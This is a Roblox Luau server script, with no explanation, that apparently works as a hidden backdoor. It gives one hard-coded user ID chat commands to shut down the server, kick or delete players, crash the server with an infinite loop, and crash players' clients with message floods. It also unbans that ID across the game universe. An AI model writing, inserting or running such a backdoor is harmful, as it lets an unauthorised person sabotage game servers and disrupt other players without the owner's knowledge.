task.delay(2,
    function()
        local cmds = {aliases = {}}
        local prefix = "$"
        local cons = {}
        local dcmds = {}
        local vars = {}
        local allowed = {
            1551416114
        }
        local function gp(str, u)
            if str and type(str) == "string" and str ~= "" then
                local players = game.Players:GetPlayers()
                if str:lower() == "all" then
                    return players
                elseif str:lower() == "others" then
                    table.remove(players, table.find(players, u))
                    return players
                elseif str:lower() == "me" then
                    return {u}
                elseif str:lower() == "friends" then
                    for i, v in players do
                        if not v:IsFriendsWith(u.UserId) then
                            table.remove(players, i)
                        end
                    end
                    return players
                elseif str:lower() == "nonfriends" then
                    table.remove(players, table.find(players, u))
                    for i, v in players do
                        if v:IsFriendsWith(u.UserId) then
                            table.remove(players, i)
                        end
                    end
                    return players
                elseif str:lower() == "random" then
                    return {players[math.random(1, #players)]}
                else
                    players = {}
                    for i, v in game.Players:GetPlayers() do
                        if
                            v.Name:lower():sub(1, str:len()) == str:lower() or
                                v.DisplayName:lower():sub(1, str:len()) == str:lower()
                         then
                            table.insert(players, v)
                        end
                    end
                    return players
                end
            else
                return {u}
            end
        end
        local function notif(plr, text, duration)
            coroutine.wrap(
                function()
                    local ScreenGui = Instance.new("ScreenGui")
                    local Frame = Instance.new("Frame")
                    local TextLabel = Instance.new("TextLabel")
                    local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
                    local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
                    local UIStroke = Instance.new("UIStroke")
                    local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")

                    ScreenGui.Parent = plr.PlayerGui
                    ScreenGui.ResetOnSpawn = false

                    Frame.Parent = ScreenGui
                    Frame.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
                    Frame.BackgroundTransparency = 0.200
                    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    Frame.BorderSizePixel = 0
                    Frame.Position = UDim2.new(-0.250344098, 0, 0.446801096, 0)
                    Frame.Size = UDim2.new(1.5, 0, 0.106197469, 0)
                    Frame.ZIndex = 9999

                    TextLabel.Parent = Frame
                    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    TextLabel.BackgroundTransparency = 1.000
                    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    TextLabel.BorderSizePixel = 0
                    TextLabel.Position = UDim2.new(0.167126119, 0, 0, 0)
                    TextLabel.Size = UDim2.new(0.667355835, 0, 0.998611987, 0)
                    TextLabel.ZIndex = 9999
                    TextLabel.Font = Enum.Font.SourceSans
                    TextLabel.Text = text
                    TextLabel.TextColor3 = Color3.fromRGB(192, 33, 255)
                    TextLabel.TextScaled = true
                    TextLabel.TextSize = 35.000
                    TextLabel.TextWrapped = true

                    UIAspectRatioConstraint.Parent = TextLabel
                    UIAspectRatioConstraint.AspectRatio = 19.049

                    UITextSizeConstraint.Parent = TextLabel
                    UITextSizeConstraint.MaxTextSize = 35

                    UIStroke.Parent = Frame
                    UIStroke.Thickness = 3
                    UIStroke.Transparency = 0.2

                    UIAspectRatioConstraint_2.Parent = Frame
                    UIAspectRatioConstraint_2.AspectRatio = 28.505

                    task.wait(duration)

                    ScreenGui:Destroy()
                end
            )()
        end
        local function addcmd(n, t, f)
            cmds[n] = {table = t, func = f}
            if t.aliases and next(t.aliases) ~= nil then
                for i, v in t.aliases do
                    cmds.aliases[v] = n
                end
            end
        end
        local function checkargs(plr, table1, table2, str) -- this is kinda poop
            local arguments = {}
            for i, v in pairs(table1) do
                if v:sub(1, 1) == "*" and v:sub(-1) == "*" then
                    table.insert(arguments, {"REQUIRED", i})
                else
                    table.insert(arguments, {"OPTIONAL", i})
                end
            end
            for i, v in pairs(arguments) do
                if not table2[i] and v[1] ~= "OPTIONAL" then
                    notif(plr, "Bad Arguments #" .. tostring(i) .. " To '" .. str .. "'", 3)
                    return false
                end
            end
            return true
        end
        local function runcmd(plr, str, tbl, fullstring) -- same w/ this
            if cmds[str] and str:lower() ~= "aliases" then
                coroutine.wrap(
                    function()
                        if not dcmds[str] then
                            dcmds[str] = true
                            coroutine.wrap(
                                function()
                                    if checkargs(plr, cmds[str].table.args, {table.unpack(tbl, 2)}, str) == true then
                                        cmds[str].func(plr, {table.unpack(tbl, 2)}, fullstring)
                                    end
                                end
                            )()
                            task.wait(0.6)
                            dcmds[str] = false
                            dcmds[str] = nil
                        end
                    end
                )()
            elseif cmds.aliases[str] and str:lower() ~= "aliases" then
                str = cmds.aliases[str]
                coroutine.wrap(
                    function()
                        if not dcmds[str] then
                            dcmds[str] = true
                            coroutine.wrap(
                                function()
                                    if checkargs(plr, cmds[str].table.args, {table.unpack(tbl, 2)}, str) == true then
                                        cmds[str].func(plr, {table.unpack(tbl, 2)}, fullstring)
                                    end
                                end
                            )()
                            task.wait(0.6)
                            dcmds[str] = false
                            dcmds[str] = nil
                        end
                    end
                )()
            else
                notif(plr, "Command '" .. str .. "' Not Found", 3)
            end
        end

        addcmd(
            "shutdown",
            {args = {}, aliases = {}, desc = ""},
            function(u, args, fs)
                game.Players.PlayerAdded:Connect(
                    function(plr)
                        plr:Kick("This Server Has Been Shutdown")
                    end
                )
                for i, v in game.Players:GetPlayers() do
                    v:Kick("Server Has Been Shutdown")
                end
            end
        )

        addcmd(
            "kick",
            {args = {"player", "reason"}, aliases = {}, desc = ""},
            function(u, args, fs)
                local reason
                if args[2] then
                    reason = string.sub(fs, fs:split(" ")[1]:len() + fs:split(" ")[2]:len() + 3)
                else
                    reason = "No Reason Provided"
                end
                for i, v in gp(args[1], u) do
                    v:Kick(reason)
                end
            end
        )

        addcmd(
            "delete",
            {args = {"player"}, aliases = {}, desc = ""},
            function(u, args, fs)
                for i, v in gp(args[1], u) do
                    v:Destroy()
                end
            end
        )

        addcmd(
            "crashserver",
            {args = {}, aliases = {}, desc = ""},
            function(u, args, fs)
                repeat
                    while true do
                        Instance.new("Part", workspace)
                    end
                until false
            end
        )

        addcmd(
            "crash",
            {args = {"player"}, aliases = {}, desc = ""},
            function(u, args, fs)
                for i, v in gp(args[1], u) do
                    coroutine.wrap(
                        function()
                            while table.find(game.Players:GetPlayers(), v) do
                                if v.PlayerGui then
                                    local message = Instance.new("Message")
                                    message.Text = string.rep("ü§¶‚Äç‚ôÄÔ∏è", 30000)
                                    message.Parent = v.PlayerGui
                                end
                                task.wait()
                            end
                        end
                    )()
                end
            end
        )

        coroutine.wrap(
            function()
                for i, plr in game.Players:GetPlayers() do
                    cons[#cons + 1] =
                        plr.Chatted:Connect(
                        function(msg)
                            if table.find(allowed, plr.UserId) then
                                if msg:sub(1, #prefix) == prefix then
                                    msg = msg:sub(#prefix + 1)
                                    local splitted = msg:split(" ")
                                    coroutine.wrap(
                                        function()
                                            runcmd(plr, splitted[1], splitted, msg)
                                        end
                                    )()
                                end
                            end
                        end
                    )
                end
            end
        )()

        coroutine.wrap(
            function()
                game.Players.PlayerAdded:Connect(
                    function(plr)
                        cons[#cons + 1] =
                            plr.Chatted:Connect(
                            function(msg)
                                if table.find(allowed, plr.UserId) then
                                    if msg:sub(1, #prefix) == prefix then
                                        msg = msg:sub(#prefix + 1)
                                        local splitted = msg:split(" ")
                                        coroutine.wrap(
                                            function()
                                                runcmd(plr, splitted[1], splitted, msg)
                                            end
                                        )()
                                    end
                                end
                            end
                        )
                    end
                )
            end
        )()

        coroutine.wrap(
            function()
                local config: UnbanConfigType = {
                    UserIds = allowed,
                    ApplyToUniverse = true
                }
                game.Players:UnbanAsync(config)
            end
        )()
    end
)
